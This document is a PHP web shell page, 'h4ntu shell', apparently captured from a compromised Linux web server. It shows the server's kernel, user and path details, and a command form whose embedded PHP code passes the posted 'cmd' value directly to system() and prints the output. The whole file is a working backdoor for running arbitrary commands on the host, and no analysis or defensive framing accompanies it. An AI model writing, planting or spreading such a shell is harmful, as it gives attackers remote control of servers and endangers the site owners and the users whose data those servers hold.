<title>h4ntu shell [powered by tsoi]</title>
<p><font size=2 face=Verdana><b>This Is The Server Information</b></font></p>
<meta name="generator" content="Namo WebEditor v5.0">
<br>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;">sysname: Linux</DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;">nodename: bc78200e302e</DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;">release: 3.10.0-1160.119.1.el7.x86_64</DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;">version: #1 SMP Tue Jun 4 14:43:51 UTC 2024</DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;">machine: x86_64</DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;">domainname: (none)</DIV></TD>
  </TR>
  <TR>

  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>User Info:</b> uid=33(www-data) euid=33(www-data) gid=33(www-data)</DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Current Path:</b> /var/www/html</DIV></TD>

  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?></DIV></TD>
  </TR>  
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Services:</b>  </DIV></TD>
  </TR>

  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Adress:</b>  </DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Script Current User:</b> root</DIV></TD>
  </TR>
  <TR>

  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>PHP Version:</b> 7.4.33</DIV></TD>
  </TR>
</TABLE>
<BR>

<font face="courier new" size="2" color="777777"><b>#</b>php injection: <br>
</font><FORM name=injection METHOD=POST ACTION="/h4ntu_shell_%5Bpowered_by_tsoi%5D.php">
<font face="courier new" size="2" color="777777">cmd : 
<INPUT TYPE="text" NAME="cmd" value="" size="161">
<br>
<INPUT TYPE="submit">
</font></FORM>

<hr color=777777 width=100% height=115px>

<pre>
<?
$cmd = $_POST['cmd'];
  if (isset($chdir)) @chdir($chdir);
  ob_start();
  system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
  $output = ob_get_contents();
  ob_end_clean();
  if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
exit;
?>
</pre>
